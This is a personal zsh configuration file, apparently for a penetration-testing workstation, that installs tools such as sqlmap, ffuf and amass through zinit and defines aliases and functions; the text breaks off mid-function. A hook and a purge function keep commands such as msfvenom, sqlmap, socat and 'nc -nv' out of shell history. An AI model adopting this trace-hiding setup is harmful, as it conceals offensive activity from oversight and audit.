zmodload zsh/zprof
unset PATH
PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
export PYENV_ROOT="${HOME}/.zinit/plugins/pyenv"
PATH=${PATH}:${HOME}/.local/bin
PATH=${PATH}:${GOPATH}/bin
PATH=${PATH}:${HOME}/script
PATH=${PATH}:${HOME}/.config/nvim/plugged/asynctasks.vim/bin
PATH=${PYENV_ROOT}/shims:${PATH}
export PATH
# history {{{
#
# Sets history options.
#
# Authors:
#   Robby Russell <robby@planetargon.com>
#   Sorin Ionescu <sorin.ionescu@gmail.com>
#

HISTFILE="${HOME}/.zsh_history"
HISTSIZE=10000000
SAVEHIST=10000000


setopt BANG_HIST                 # Treat the '!' character specially during expansion.
setopt EXTENDED_HISTORY          # Write the history file in the ":start:elapsed;command" format.
setopt INC_APPEND_HISTORY        # Write to the history file immediately, not when the shell exits.
setopt SHARE_HISTORY             # Share history between all sessions.
setopt HIST_EXPIRE_DUPS_FIRST    # Expire duplicate entries first when trimming history.
setopt HIST_IGNORE_DUPS          # Don't record an entry that was just recorded again.
setopt HIST_IGNORE_ALL_DUPS      # Delete old recorded entry if new entry is a duplicate.
setopt HIST_FIND_NO_DUPS         # Do not display a line previously found.
setopt HIST_IGNORE_SPACE         # Don't record an entry starting with a space.
setopt HIST_SAVE_NO_DUPS         # Don't write duplicate entries in the history file.
setopt HIST_REDUCE_BLANKS        # Remove superfluous blanks before recording entry.
setopt HIST_VERIFY               # Don't execute immediately upon history expansion.
setopt HIST_BEEP                 # Beep when accessing nonexistent history.
setopt HIST_IGNORE_SPACE         # 删除以空格开头的命令
setopt HIST_REDUCE_BLANKS        # 删除多余的空格
# }}}
# zinit {{{
### Added by Zinit's installer
    if [[ ! -f $HOME/.zinit/bin/zinit.zsh ]]; then
    print -P "%F{33}▓▒░ %F{220}Installing %F{33}DHARMA%F{220} Initiative Plugin Manager (%F{33}zdharma-continuum/zinit%F{220})…%f"
    command mkdir -p "$HOME/.zinit" && command chmod g-rwX "$HOME/.zinit"
    command git clone --depth 1 https://github.com/zdharma-continuum/zinit "$HOME/.zinit/bin" && \
        print -P "%F{33}▓▒░ %F{34}Installation successful.%f%b" || \
        print -P "%F{160}▓▒░ The clone has failed.%f%b"
fi

source "$HOME/.zinit/bin/zinit.zsh"
autoload -Uz _zinit
(( ${+_comps} )) && _comps[zinit]=_zinit

zinit ice id-as="z-bin"
zinit light zdharma-continuum/zinit-annex-bin-gem-node

zinit ice id-as="z-readurl"
zinit light zdharma-continuum/zinit-annex-readurl

zinit ice depth="1" id-as="vi-mode"
zinit light jeffreytse/zsh-vi-mode


zinit ice depth"1" id-as='pw10k'
zinit light romkatv/powerlevel10k



zinit  light-mode lucid wait="0"  for\
    id-as='fzf-tab'             "Aloxaf/fzf-tab" \
    id-as='syntax'              "zdharma-continuum/fast-syntax-highlighting" \
    id-as='evalcache'           "mroth/evalcache" \
    id-as='autosuggestions'     atload='_zsh_autosuggest_start' 'zsh-users/zsh-autosuggestions' \
    id-as='docker-completion'   as="completion" mv="%ID% -> _docker" "https://raw.githubusercontent.com/docker/cli/master/contrib/completion/zsh/_docker"\
    id-as='search-command'      "zdharma-continuum/history-search-multi-word" \
    id-as='proxychains-ng_completion' mv="%ID% ->_proxychains" as="completion" "https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/completions/_proxychains" \
    id-as='adb-completion'      as="completion" mv="%ID% -> _adb" "https://github.com/ohmyzsh/ohmyzsh/blob/master/plugins/adb/_adb"\
    id-as='autopep8-completion' as="completion" mv="%ID% -> _autopep8" "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/autopep8/_autopep8"\
    id-as='httpie-completion'   as="completion" mv="%ID% -> _httpie" "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/httpie/_httpie"\
    id-as='cht_completion'      as="completion" mv="%ID% -> _cht"    "https://cheat.sh/:zsh"\
    id-as='gf_completion'       as="completion" mv="%ID% -> _gf"    "https://raw.githubusercontent.com/tomnomnom/gf/master/gf-completion.zsh"\
    id-as='tmuxinator_completion'   as="completion" mv="%ID% -> _tmuxinator"    "https://raw.githubusercontent.com/tmuxinator/tmuxinator/master/completion/tmuxinator.zsh"\
    id-as='alias-tips'          "djui/alias-tips" \
    id-as='fzf-marks'           "urbainvaes/fzf-marks" \
    id-as='fz'                  "changyuheng/fz" \
    id-as='fzf-completion'      "https://raw.githubusercontent.com/junegunn/fzf/master/shell/completion.zsh"\
    id-as='alias-finder'        "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/alias-finder/alias-finder.plugin.zsh" \
    id-as='safe-paste'          "OMZ::plugins/safe-paste/safe-paste.plugin.zsh" \
    id-as='copyfile'            "OMZ::plugins/copyfile/copyfile.plugin.zsh"\
    id-as='z.lua'               "skywind3000/z.lua"\
    id-as='git-alias'           atload="unalias gra glo ga  gd grh gcf gcb gco gss gclean grb gf" "OMZ::plugins/git/git.plugin.zsh"\
    id-as='forgit'              "wfxr/forgit"\
    id-as='gpg-crypt'           "Czocher/gpg-crypt" \
    id-as='git-flow-completion' "bobthecow/git-flow-completion" \
    id-as='k'                   "supercrabtree/k" \
    id-as='cd-reminder'         "bartboy011/cd-reminder" \
    id-as='blackbox'            "StackExchange/blackbox"\
    id-as='zsh-case'            "rtuin/zsh-case"\
    id-as='base-64'             "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/encode64/encode64.plugin.zsh" \
    id-as='hitokoto'            "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/hitokoto/hitokoto.plugin.zsh"\
    id-as='copypath'             "https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/plugins/copypath/copypath.plugin.zsh" \
    id-as='clipbord'            "https://github.com/ohmyzsh/ohmyzsh/blob/master/lib/clipboard.zsh" 

# id-as="msfvenom"            as="completion" mv="%ID% ->_msfvenom" "https://raw.githubusercontent.com/Green-m/msfvenom-zsh-completion/master/_msfvenom" \
# id-as='host-switch'         "LockonS/host-switch"
zinit ice lucid wait="0" id-as="eval.zsh"
zinit snippet $(echo "${HOME}/.config/custom/eval.zsh")

zinit ice lucid depth"1" wait="0" id-as="extract"
zinit snippet OMZ::plugins/extract


zinit ice lucid wait="0" id-as="bindkey"
zinit snippet $(echo "${HOME}/.config/custom/bindkey.sh")

zinit ice blockf lucid wait="0" atclone="zinit creinstall rsh_zshcompletions" id-as="rsh_zshcompletions" as="completion"
zinit light rsherstnev/zshcompletions

zinit ice blockf lucid wait="0" atload='zpcompinit;zpcdreplay' atclone="zinit creinstall zsh-completions" id-as="zsh-completions" as="completion"
zinit light zsh-users/zsh-completions

zinit ice wait="1" lucid id-as="autopair"
zinit light hlissner/zsh-autopair

# docker-compose
zinit ice from"gh-r" as"null" mv"docker* -> docker-compose" id-as="docker-compose" wait="1" lucid sbin="docker-compose" bpick="docker-compose-linux-x86_64"
zinit light docker/compose

# clash-premium
zinit ice id-as='clash' as='null'  from="gh-r" ver="premium" mv="clash-* -> clash" atclone="cp -f clash* /usr/bin/clash" atpull="%atclone" sbin="clash"  bpick="*linux-amd64*" wait="1" lucid
zinit light Dreamacro/clash

zinit ice id-as="delta" mv="delta* -> delta" sbin="delta/delta" bpick="*x86_64*musl*" from="gh-r"
zinit light dandavison/delta

zinit ice id-as="fzf" from="gh-r" sbin bpick="*linux_amd64*"
zinit light junegunn/fzf 

zinit  as="null" wait="1" lucid from="gh-r" bpick="*x86_64*" for \
    id-as="lazygit"                                  sbin                             jesseduffield/lazygit\
    id-as="navi"                                     sbin                             denisidoro/navi\

# 快速切换 host 文件的 zsh 脚本
zinit ice id-as="dacuoxian" as="bin"  sbin="dacuoxian" lucid wait="1"
zinit snippet https://raw.githubusercontent.com/chenjianjx/dacuoxian/master/dacuoxian.sh

# zinit pack for fzf
# direnv 进入目录的时候自动加载和卸载环境变量 
zinit from"gh-r" as"null" mv"direnv* -> direnv" sbin="direnv" id-as="direnv" bpick="*linux*" wait="1" lucid\
    for \
        direnv/direnv

zinit ice wait="1" lucid  from="gh-r"  sbin="asmfmt"  id-as="asmfmt" bpick="*Linux_x86_64*"
zinit light klauspost/asmfmt

zinit ice wait="1" lucid  from="gh-r" mv"shfmt* -> shfmt"  sbin="shfmt"  id-as="shfmt" bpick="*linux*amd64*"
zinit light mvdan/sh

# 仅仅在 $(git --version) < 2.55 时可以使用
# zinit ice cloneopts="--depth 1 --filter=blob:none --sparse" atclone="git sparse-checkout set shell-completion/zsh" as="completion" id-as="systemd-completion" wait="0" lucid
# zinit light https://github.com/systemd/systemd

# zinit ice svn as="completion" id-as="systemd-completion" wait="0" lucid
# zinit snippet https://github.com/systemd/systemd/tree/main/shell-completion/zsh
#
# 安装 systemctl 补全 系统为 kali linux , 只需要运行一次

if test -f "${HOME}/.config/.install.lock";then
else
    sys_compleation=$(find /usr/share/zsh -name "_systemctl")
    if test "$?" -eq 0;then
        zinit creinstall $(dirname $sys_compleation)
    fi
    touch "${HOME}/.config/.install.lock"
fi

# gogs 轻量的 类似于 github 的系统
zinit ice wait="1" lucid  from="gh-r"  sbin="gogs/gogs"  id-as="gogs"
zinit light gogs/gogs

# zinit ice wait="1" as="null" lucid atclone="./configure --prefix=${ZPFX} --sysconfdir=${HOME}/.config;make" atpull="%atclone" id-as="proxychains-ng" sbin="proxychains4"
# zinit light rofl0r/proxychains-ng
#
# socat 用于转发流量
# http://www.dest-unreach.org/socat/download/socat-1.7.4.3.tar.gz
#
# zinit ice wait="1"  as="readurl" lucid extract id-as="socat" sbin="socat" dlink="/socat/download/socat-%VERSION%.tar.gz"
# zinit snippet http://www.dest-unreach.org/socat/download
#
#atuin 使用 sqlite3 来保存 shell 命令历史, 并且可以在多台机器间加密同步命令历史
# zinit ice wait="1" lucid mv="atuin* -> atuin" from="gh-r" atpull="%atclone" atclone="chown ${USERNAME}:${USERNAME} atuin/completions/*;zinit creinstall atuin"  sbin="atuin/atuin" id-as="atuin"
# zinit light ellie/atuin

# zsh_autosuggest 使用 atuin 的提示
# _zsh_autosuggest_strategy_atuin_suggest() {
#     local tmp=$(atuin search "$1" --cmd-only | tail -n 1)
#     suggestion=$tmp
# }
# ZSH_AUTOSUGGEST_STRATEGY=atuin_suggest
#
# sqlite3 已经编译好的静态二进制文件
# zinit ice wait="1" lucid from="gh-r" sbin="sqlite3" id-as="sqlite3" bpick="sqlite3"
# zinit light CompuRoot/static-sqlite3

# histdb 将 zsh history 存储在 sqlite3 数据库中
zinit ice wait="1" lucid from="gh-r" mv="ri* -> rg" sbin="rg/rg" atclone="chown ${USERNAME}:${USERNAME} rg/complete/*;zinit creinstall rg" atpull="%atclone" id-as="rg"
zinit light BurntSushi/ripgrep

zinit ice wait="1" lucid from="gh-r" mv="fd* -> fd" sbin="fd/fd" atclone="chown ${USERNAME}:${USERNAME} fd/autocomplete/*;zinit creinstall fd" atpull="%atclone" id-as="fd" bpick="*x86_64*"
zinit light @sharkdp/fd

#  dig 的替代品, 用于查询 DNS
zinit ice wait="1" lucid from="gh-r" sbin="bin/dog" atclone="chown ${USERNAME}:${USERNAME} dog/completions/*;cp completions/dog.zsh _dog;zinit creinstall dog" atpull="%atclone" id-as="dog"
zinit light ogham/dog

zinit ice lucid depth="1" wait="1" id-as="dirhistory"
zinit snippet OMZ::plugins/dirhistory

zinit ice wait="1" lucid from="gh-r" mv="bat* -> bat" sbin="bat/bat"   atclone="cp bat/autocomplete/bat.zsh bat/autocomplete/_bat;chown ${USERNAME}:${USERNAME} bat/autocomplete/*;zinit creinstall bat" atpull="%atclone" id-as="bat" bpick="*x86_64*linux*musl*"
zinit light @sharkdp/bat

zinit ice wait="1" lucid from="gh-r"  sbin="bin/exa"  cp="completions/exa.zsh -> completions/_exa"  atclone="chown ${USERNAME}:${USERNAME} completions/*;zinit creinstall exa" atpull="%atclone" id-as="exa"
zinit light ogham/exa

# git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
zinit ice wait="1" lucid depth="1"  cp="sqlmap.py => sqlmap" sbin="sqlmap" id-as="sqlmap"
zinit light sqlmapproject/sqlmap

# Openvpn 项目的 easy-rsa 工具, 用于创建一个 PKI,包括根证书和中间CA以及可以签署服务器证书
zinit ice wait="1" from="gh-r" lucid depth="1"  sbin="easyrsa/easyrsa" id-as="easyrsa" bpick="*.tgz" mv="EasyRSA* => easyrsa"
zinit light OpenVPN/easy-rsa

# zoxide cd 的替代品
# zinit  ice wait="1" lucid from="gh-r" sbin="zoxide" id-as="zoxide"
# zinit light ajeetdsouza/zoxide

# pyenv python 虚拟环境
zinit  ice wait="1" as='null' lucid depth="1"  sbin="bin/pyenv" id-as="pyenv" atclone="cp completions/pyenv.zsh completions/_pyenv; zinit creinstall pyenv"
zinit light pyenv/pyenv

# 使用预编译的 lua 二进制文件
# https://github.com/philanc/slua/raw/master/bin/slua
# https://raw.githubusercontent.com/philanc/slua/master/bin/slua
# zinit ice id-as="lua" as="bin" mv="%ID% -> lua" sbin="lua"
# zinit light https://raw.githubusercontent.com/philanc/slua/master/bin/slua

# 使用预编译的 lua 二进制文件
zinit ice as="null" id-as='lua'  run-atpull atclone="wget https://raw.githubusercontent.com/philanc/slua/master/bin/slua;mv slua lua" atpull="%atclone" sbin="lua" wait="1" lucid
zinit light zdharma-continuum/null

# python 区块{{{
if [ -x "$(command -v pip3)" ]; then
    # httpe wget 和 curl 的替代品
    zinit ice as="null"  id-as='httpie' run-atpull atclone="pip3 install  httpie" atpull="pip3 install  --upgrade httpie"  wait="1" lucid
    zinit light zdharma-continuum/null
    # zinit ice as="null"  id-as='httpie' lucid wait="1" pip="httpie"
    # zinit light zdharma-continuum/null

    zinit ice as="null"  id-as='ranger' run-atpull atclone="pip3 install  ranger-fm" atpull="pip3 install  --upgrade ranger-fm"  wait="1" lucid
    zinit light zdharma-continuum/null

    zinit ice as="null"  id-as='asciinema' run-atpull atclone="pip3 install  asciinema" atpull="pip3 install  --upgrade asciinema"  wait="1" lucid
    zinit light zdharma-continuum/null

    zinit ice as="null"  id-as='python-neovim' run-atpull atclone="pip3 install  neovim" atpull="pip3 install  --upgrade neovim" wait="1" lucid
    zinit light zdharma-continuum/null

    zinit ice as="null"  id-as='autopep8' run-atpull atclone="pip3 install  autopep8" atpull="pip3 install  --upgrade autopep8" wait="1" lucid
    zinit light zdharma-continuum/null

    zinit ice as="null"  id-as='glances' run-atpull atclone="pip3 install  glances" atpull="pip3 install  --upgrade glances" wait="1" lucid
    zinit light zdharma-continuum/null

    zinit ice as="null"  id-as='pyyaml' run-atpull atclone="pip3 install  pyyaml" atpull="pip3 install  --upgrade pyyaml" wait="1" lucid
    zinit light zdharma-continuum/null

    zinit ice as="null"  id-as='gita' run-atpull atclone="pip3 install  gita" atpull="pip3 install  --upgrade gita" wait="1" lucid
    zinit light zdharma-continuum/null

    zinit ice as="null"  id-as='nginxfmt' run-atpull atclone="pip3 install  nginxfmt" atpull="pip3 install  --upgrade nginxfmt" wait="1" lucid
    zinit light zdharma-continuum/null

    # mycli mysql 带语法提示的客户端
    zinit ice as="null"  id-as='mycli' run-atpull atclone="pip3 install  mycli" atpull="pip3 install  --upgrade mycli" wait="1" lucid
    zinit light zdharma-continuum/null

    # 类似于 tmuxinator 
    zinit ice as="null"  id-as='tmuxp' run-atpull atclone="pip3 install  tmuxp" atpull="pip3 install  --upgrade tmuxp" wait="1" lucid
    zinit light zdharma-continuum/null

    # litecli 类似 mycli 的第 sqlite  客户端
    zinit ice as="null"  id-as='litecli' run-atpull atclone="pip3 install  litecli" atpull="pip3 install  --upgrade litecli" wait="1" lucid
    zinit light zdharma-continuum/null

    # python 实现的类似 systemd 的服务管理软件
    zinit ice as="null"  id-as='supervisor' run-atpull atclone="pip3 install  supervisor" atpull="pip3 install  --upgrade supervisor" wait="1" lucid
    zinit light zdharma-continuum/null

    # http-prompt 交互式的 http 客户端
    # zinit ice as="null"  id-as='http-prompt' run-atpull atclone="pip3 install  http-prompt" atpull="pip3 install  --upgrade http-prompt" wait="1" lucid
    # zinit light zdharma-continuum/null

fi
# }}}
#go 区块{{{

#}}}
#
#node.js 区块 {{{
if [ -x "$(command -v npm)" ]; then
    zinit ice as="null"  id-as='yarn' run-atpull atclone="npm install -g yarn" atpull="npm update yarn" wait="1" lucid
    zinit light zdharma-continuum/null

    zinit ice as="null"  id-as='fixjson' run-atpull atclone="npm install -g fixjson" atpull="npm update fixjson" wait="1" lucid
    zinit light zdharma-continuum/null

    zinit ice as="null"  id-as='npm-neovim' run-atpull atclone="npm install -g neovim" atpull="npm update neovim" wait="1" lucid
    zinit light zdharma-continuum/null

    zinit ice as="null"  id-as='commitizen' run-atpull atclone="npm install -g commitizen" atpull="npm update commitizen" wait="1" lucid
    zinit light zdharma-continuum/null

    zinit ice as="null"  id-as='cz-customizable' run-atpull atclone="npm install -g cz-customizable" atpull="npm update cz-customizable" wait="1" lucid
    zinit light zdharma-continuum/null

    zinit ice as="null"  id-as='cz-conventional-changelog' run-atpull atclone="npm install -g cz-conventional-changelog" atpull="npm update cz-conventional-changelog" wait="1" lucid
    zinit light zdharma-continuum/null

    # 统计代码行数的工具
    zinit ice as="null"  id-as='cloc' run-atpull atclone="npm install -g cloc" atpull="npm update cloc" wait="1" lucid
    zinit light zdharma-continuum/null
fi
#}}}
zinit ice as="null"  id-as='tpm' run-atpull atclone="git clone https://github.com/tmux-plugins/tpm ~/.tmux/plugins/tpm" atpull="cd ${HOME}/.tmux/plugins/tpm; git pull" wait="1" lucid
zinit light zdharma-continuum/null

# vim-plug vim 插件管理器
zinit ice as="null"  id-as='nvim-plug' run-atpull atclone="curl -fLo "${XDG_DATA_HOME:-$HOME/.local/share}"/nvim/site/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim" wait="1" lucid
zinit light zdharma-continuum/null

# packer.nvim
zinit ice as="null"  id-as='packer.nvim' run-atpull atclone="git clone https://github.com/wbthomason/packer.nvim ~/.local/share/nvim/site/pack/packer/start/packer.nvim" atpull="cd ${HOME}/.local/share/nvim/site/pack/packer/start/packer.nvim;git pull" wait="1" lucid
zinit light zdharma-continuum/null

# my navi cheatsheet
zinit ice as="null"  id-as='navi-cheatsheet' run-atpull atclone="git clone https://github.com/Coxianyu/cheatsheet ~/.local/share/navi/cheats/cheatsheet" atpull="cd ${HOME}/.local/share/navi/cheats/cheatsheet; git pull" wait="1" lucid
zinit light zdharma-continuum/null



# 点文件管理器
# zinit ice wait="1" lucid from="gh-r" id-as="chezmoi" bpick="*linux_amd64.tar.gz*" sbin="chezmoi" cp="completions/chezmoi.zsh -> completions/_chezmoi" atclone="chown ${USERNAME}:${USERNAME} completions/*;zinit creinstall chezmoi" atpull="%atclone"
# zinit light twpayne/chezmoi
#





# proxyman 快速设置代理
# zinit ice wait="1" lucid atclone="./install" id-as="proxyman" atpull="%atclone" as="null"
# zinit light himanshub16/ProxyMan
#
# https://dev.yorhel.nl/download/


# amass
zinit ice wait="1" lucid from="gh-r"  fbin="amass/amass"  mv="amass* -> amass"   id-as="amass" bpick="*amd64.zip" lucid
zinit light OWASP/Amass

# tmxu-powerline
zinit ice wait="1" lucid cloneonly id-as="tmux_theme" cloneopts="--depth 1" reset atpull="%atclone"  atclone="cp -f ~/.config/default.sh ${HOME}/.zinit/plugins/tmux_theme/themes/default.sh"
zinit light erikw/tmux-powerline

# git-flow
zinit ice wait="1" lucid as="null"  id-as="git-flow" mv="%ID% -> git-flow.sh" atclone="chmod u+x git-flow.sh;export INSTALL_PREFIX=${HOME}/.local/bin;./git-flow.sh"
zinit snippet https://raw.github.com/nvie/gitflow/develop/contrib/gitflow-installer.sh

# neovim
zinit ice wait="1" lucid as="null" from="gh-r" id-as="neovim" mv="nvim* -> neovim" sbin="neovim/bin/nvim" bpick="*linux64.tar.gz"
zinit light neovim/neovim

# acme.sh
zinit ice wait="1" lucid as="null" id-as="acme" depth="1" sbin="acme.sh"
zinit light acmesh-official/acme.sh

zinit ice wait="1" lucid as="bin" id-as="tmux-fzf" sbin="tmux-fzf"
zinit snippet https://raw.githubusercontent.com/junegunn/fzf/master/bin/fzf-tmux


# gron json 处理器
zinit ice wait='1' lucid as="null" id-as="gron"  from="gh-r" sbin="gron" bpick="*linux*"
zinit light tomnomnom/gron

# skm ssh key manager 
zinit ice wait='1' lucid as="null" id-as="skm"  from="gh-r" sbin="skm" bpick="*linux*"
zinit light TimothyYe/skm

zinit ice wait='1' lucid as="null" id-as="ydict"  from="gh-r" sbin="ydict" bpick="*linux*"
zinit light TimothyYe/ydict

# 一个单二进制文件的用于快速备份文件的软件
zinit ice wait='1' lucid as="null" id-as="restic"  mv="restic* -> restic" from="gh-r" sbin="restic" bpick="*linux*"
zinit light restic/restic


# ffuf  fast fuzzer
zinit ice wait="1" lucid as="null" id-as="ffuf" from="gh-r" sbin="ffuf" bpick="*linux*"
zinit light ffuf/ffuf
# last.zsh 用于执行在最后加载的函数， 用于覆盖一些插件的函数
zinit ice lucid wait="1" id-as="last.zsh"
zinit snippet $(echo "${HOME}/.config/custom/last.zsh")
#https://github.com/tomnomnom/gf 
# End of Zinit's installer chunk
# }}}
### z.lua {{{
# 识别根目录的文件
export _ZL_ROOT_MARKERS=".git,.svn,.hg,.root,package.json"
export _ZL_CMD='j'
# }}}
# P10K{{{
# Enable Powerlevel10k instant prompt. Should stay close to the top of ~/.zshrc.
# Initialization code that may require console input (password prompts, [y/n]
# confirmations, etc.) must go above this block; everything else may go below.
typeset -g POWERLEVEL9K_INSTANT_PROMPT=quiet
if [[ -r "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh" ]]; then
    zinit ice id-as="p10k-instan-prompt"
    zinit snippet $(echo "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh")
  # source "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh"
fi
# }}}
### fzf {{{
# 显示隐藏文件 排除 .git 文件夹
export FZF_DEFAULT_COMMAND='fd --type file --follow --hidden --exclude .git --color=always'
# 设置颜色显示
#export FZF_DEFAULT_COMMAND="fd --type file --color=always"
# export FZF_DEFAULT_OPTS="--ansi --preview-window 'right:60%' --preview 'batcat --color=always --style=header,grid --line-range :300 {}'"
export FZF_DEFAULT_OPTS="--ansi"
#}}}
## 环境变量 {{{
export TZ='Asia/Shanghai'
export DOTBARE_DIR="${HOME}/.myconfig"
export DOTBARE_TREE="${HOME}"

# 关闭 direnv 的显示
# export DIRENV_LOG_FORMAT=

# ips=$(ip -o addr show up primary scope global |while read -r num dev fam addr rest; do echo ${addr%/*}; done)
# hostname -I | tr ' ' '\n' 
export LOCAL_IP=$(hostname -I | tr ' ' '\n' | head -n 1)
export PROXYCHAINS_CONF_FILE="${HOME}/.config/proxychains4.conf"
export LISTEN_IP="0.0.0.0"
export RANGER_ZLUA="${HOME}/.zinit/plugins/z.lua/z.lua"
export TARGET_IP=""
export TARGET_URL=""
export TARGET_HTTP_PORT="80"
export TARGET_HTTPS_PORT="443"
export TARGET_FQDN=""
export LOCAL_PORT="443"
export HOST_ROOT_PATH="${HOME}"
export GOPATH="${HOME}/.local/go"
export BIN="${HOME}/.local/bin"
export TEMP=$(uuid | tr -d '-' | cut -c '1-8')


if [ -x "$(command -v nvim)" ]; then
    export EDITOR='nvim'
    export MANPAGER="nvim -c MANPAGER -"
    export PAGER="nvim -c PAGER -"
elif [ -x "$(command -v vim)" ]; then
    export EDITOR='vim'
else
    export MANPAGER="less -RF"
    export PAGER="less -RF"
fi


less --mouse 2>&1 | rg "no mouse" >/dev/null 2>&1
if test "$?" -eq 0;then
    export BAT_PAGER="less -RF"
    export DELTA_PAGER="less -RF"
else
    export BAT_PAGER="less --RAW-CONTROL-CHARS --quit-if-one-screen --mouse"
    export DELTA_PAGER="less --RAW-CONTROL-CHARS --quit-if-one-screen --mouse"
fi

export PYTHON_CONFIGURE_OPTS="--disable-ipv6"

export SSH_AUTH_SOCK=$(gpgconf --list-dirs agent-ssh-socket)
export GPG_TTY=$(tty)
export LANG="zh_CN.UTF-8"

LINUX_FILETYPE=''
ZSH_AUTOSUGGEST_BUFFER_MAX_SIZE=20
ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=8,bold,underline'
# ZSH_AUTOSUGGEST_STRATEGY=(history)
ZSH_AUTOSUGGEST_HISTORY_IGNORE="clear*|echo *"

#}}}
###alias {{{
alias composer='php composer.phar'
alias cl='clear'
if [ -x "$(command -v exa)" ]; then
    alias ls="exa"
    alias la="exa --long --all --group"
    alias ll="exa --long --group"
else
    la='ls -alh --color=auto'
    ll='ls -lh --color=auto'
fi
if [ -x "$(command -v rg)" ]; then
    alias grep='rg'
else
    alias rg='grep --color=auto'
fi
if [ -x "$(command -v fd)" ]; then
    alias find='fd'
else
    alias fd='find'
fi
if [ -x "$(command -v bat)" ]; then
    alias cat="bat"
else
    alias bat="cat"
fi
if [ -x "$(command -v nvim)" ]; then
    alias vim="nvim"
else
    alias nvim='vim'
fi
if [ -x "$(command -v delta)" ];then
    alias diff="delta"
else
    alias delta="diff"
fi
alias 'chezmoi add'='chezmoi add --create'
# dh fzf 选择去过的路径
alias dh='j -I'
alias tasks='asynctask -f'
# de foo 使用 fzf 选择父目录
alias de='j -b -I'
# dw   使用 fzf 选择最近的 10 条路径
alias dw='j -I -t .'
# dc 跳转到当前路径下的子目录
alias dc='j -c -I'
alias gdh="git diff HEAD"
alias vitmux="$EDITOR ${HOME}/.tmux.conf"
alias gw="${HOME}/.local/go/bin/gf"
alias cht="cht.sh"
alias fgrep='fgrep --color=auto'
alias mux='tmuxinator'
alias nmap='nmap'
alias sqlmap='sqlmap --random-agent'
alias egrep='egrep --color=auto'
alias diff='diff --color=auto'
alias ip='ip --color=auto'
alias tsrc='tmux source ~/.tmux.conf'
alias batcat='bat' 
alias proxychains='proxychains4'
alias gitc='/usr/bin/git --git-dir=$HOME/.myconfig/ --work-tree=$HOME'
alias config='/usr/bin/git --git-dir=$HOME/.myconfig/ --work-tree=$HOME'
alias vimzsh="${EDITOR} ${HOME}/.zshrc"
alias vimtmux="${EDITOR} ${HOME}/.tmux.conf"
alias vimconfig="${EDITOR} ${HOME}/.config/nvim/init.vim"
alias zshconfig=vimzsh
alias vimproxy="${EDITOR} ${HOME}/.config/proxychains4.conf"
alias vimark="${EDITOR} ${HOME}/.fzf-marks"
alias exa='exa --icons'
alias viminstall="${EDITOR} ~/.config/install.sh"
alias install="~/.config/install.sh"
alias prz='proxychains4 -q zsh'
alias pr='proxychains4 -q'
#}}}
#function{{{

if test -f "${HOME}/.config/secret/clash-download.sh";then
    source ${HOME}/.config/secret/clash-download.sh
fi
function proxytest() {
    proxychains4 curl www.google.com >> /tmp/test$RANDOM
}
function _z() { _zlua "$@"; }
function ffufr() {
  ffuf -c -w "/path/to/SecLists/Discovery/Web-Content/$1" -u "$2/FUZZ" -recursion
}
# work with Burp
function ffufb(){
    ffuf -reply-proxy http://127.0.0.1:8080 -w $(fzf)
}
 
function install-init(){
    source ${HOME}/.config/install.sh
}
# 不记录错误的历史命令
# 同时不记录 echo 开头的命令 
# 不记录 tmux select-pane
# 不记录 git clone
# 不记录 wget 
# 不记录 curl
# 不记录 x
# 不记录 rm
# 不记录 ls
# 不记录 cp 
# 不记录 mv
# 不记录 locate
# 不记录 find
# 不记录 ssh
# 不记录 wget_echo
# 不记录以空格开头的命令， 用于执行一些不希望被记住的命令
export LIST="clang-format make g++ gcc clang apt-file awk sed echo apt rg grep find fd msfvenom curl wget rm cp find mv pass x whence wget_echo ssh ydict docker file gpg blackbox cat bat msfvenom alias mysql journalctl chmod chown su sudo asciinema czhttpd restic skm export dacuoxian dig http mycli mysql cloc kill nvim dd dw dh de dc pyenv tmuxp tmuxinator tmux socat atuin supervisorctl sqlmap sqlite3 sqlite openssl dog"
# 删除不想被记录的历史命令
zsh_history_delete(){
    array=("${(@s/ /)LIST}") # @ modifier
    for i in $array
    do
        sed  -i "/;$i/d"  "${HOME}/.zsh_history"
        sed  -i "/^$i/d"  "${HOME}/.bash_history"
    done
}
zshaddhistory() {
    emulate -L zsh
    tmp=$(echo $1 | tr -d '\n' | cut -d ' ' -f 1)
    echo $LIST | egrep -w -q "$tmp"
    if test $? -eq 0;then
        return 1
    fi
    if [[ $1 = "tmux select-pane"* ]] ; then
        return 1
    elif [[ $1 = "git clone"* ]] ; then
        return 1
    elif [[ $1 = "blackbox"* ]] ; then
        return 1
    elif [[ $1 = "alias"* ]] ; then
        return 1
    elif [[ $1 = "d "* ]] ; then
        return 1
    elif [[ $1 = "nc -nv"* ]] ; then
        return 1
    fi
    whence ${${(z)1}[1]} >| /dev/null || return 1 
    return 0
}
function cdg (){
    repo=$(gita ls | tr ' ' '\n' | fzf)
    if test -n "$repo";then
        cd $(gita ls "$repo")
    fi
}
function vimservice(){
    file=$(\find ${HOME}/.config/service -type f | fzf)
    if test -n "$file";then
        $EDITOR $file
    fi
}
function SSH_SOCK(){
    eval $(ssh-agent) > /dev/null
}
function GPG_SOCK(){
    export SSH_AUTH_SOCK=$(gpgconf --list-dirs agent-ssh-socket)
}
function vimcheat(){
    file=$(fd  . ${HOME}/.local/share/navi/cheats --type f | fzf)
    if test -n "$file";then
        $EDITOR $file
    fi
}
function vimdockercompose(){
    file=$(fd  . ${HOME}/.config/docker_compose/ --type f | fzf)
    if test -n "$file";then
        $EDITOR $file
    fi
}
function docker-repo(){
    ln -s ${HOME}/.config/secret/daemon.json /etc/docker/daemon.json
}
function cde(){
    dir=$1
    dir=$(fd . --type=d $dir --color=always |fzf --preview 'exa --icons  {}')
    if test -n "$dir";then
